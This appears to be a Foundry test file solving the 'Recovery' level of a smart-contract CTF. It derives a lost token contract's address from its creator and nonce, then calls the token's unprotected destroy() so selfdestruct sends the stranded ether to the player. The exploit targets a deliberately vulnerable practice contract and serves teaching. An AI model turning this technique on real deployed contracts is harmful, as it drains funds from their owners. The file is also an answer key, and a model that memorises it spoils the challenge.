// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Recovery, SimpleToken} from "src/levels/Recovery.sol";
import {RecoveryFactory} from "src/levels/RecoveryFactory.sol";

contract RecoverySolve is Test {
    RecoveryFactory factory;
    Recovery instance;
    address player = address(0xBEEF);

    function setUp() public {
        factory = new RecoveryFactory();
        vm.deal(player, 10 ether);
        vm.deal(address(this), 10 ether);
        instance = Recovery(factory.createInstance{value: 0.001 ether}(player));
    }

    function testInit() public view {
        assertFalse(factory.validateInstance(payable(address(instance)), player));
    }

    function testSolve() public {
        // Token yang hilang adalah kontrak PERTAMA yang dibuat Recovery
        // (nonce 1) — alamatnya dapat dihitung dari RLP:
        // keccak256(0xd6 || 0x94 || recovery || 0x01)[12:].
        address payable lost = payable(
            address(
                uint160(
                    uint256(
                        keccak256(
                            abi.encodePacked(
                                bytes1(0xd6), bytes1(0x94), address(instance), bytes1(0x01)
                            )
                        )
                    )
                )
            )
        );
        assertEq(lost.balance, 0.001 ether);
        // destroy() publik: selfdestruct mengirim saldo token ke player.
        SimpleToken(lost).destroy(payable(player));
        assertTrue(factory.validateInstance(payable(address(instance)), player));
    }
}
